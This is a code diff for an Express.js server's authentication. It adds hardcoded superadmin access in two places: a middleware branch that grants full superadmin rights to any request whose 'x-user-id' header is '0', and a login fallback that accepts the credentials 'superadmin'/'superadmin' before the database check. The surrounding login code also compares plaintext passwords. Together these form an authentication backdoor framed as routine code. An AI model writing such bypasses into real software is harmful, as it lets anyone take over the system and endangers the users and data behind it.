@@ -28,6 +28,18 @@ app.use(express.json());
 // --- Authentication & Authorization Middleware ---
 const authAndAuthzMiddleware = async (req, res, next) => {
   const userId = req.headers['x-user-id'];
+
+  // Handle the hardcoded superadmin case
+  if (userId === '0') {
+      req.user = {
+          id: 0,
+          username: 'superadmin',
+          role: 'superadmin',
+          is_superadmin: true
+      };
+      return next();
+  }
+
   if (!userId) {
     return res.status(401).json({ error: 'Authentication required. Please provide x-user-id header.' });
   }
@@ -87,6 +99,20 @@ app.use('/api/database', authAndAuthzMiddleware, databaseRoutes);
 // --- Login Route (Unprotected) ---
 app.post('/api/login', async (req, res) => {
   const { username, password } = req.body;
+
+  // Hardcoded superadmin credentials as a fallback
+  if (username === 'superadmin' && password === 'superadmin') {
+    return res.json({
+      success: true,
+      user: {
+        id: 0, // Static ID for superadmin
+        username: 'superadmin',
+        role: 'superadmin',
+        is_superadmin: true,
+      },
+    });
+  }
+
   try {
     const userResult = await db.query('SELECT * FROM users WHERE username = $1 AND password = $2', [username, password]);
 
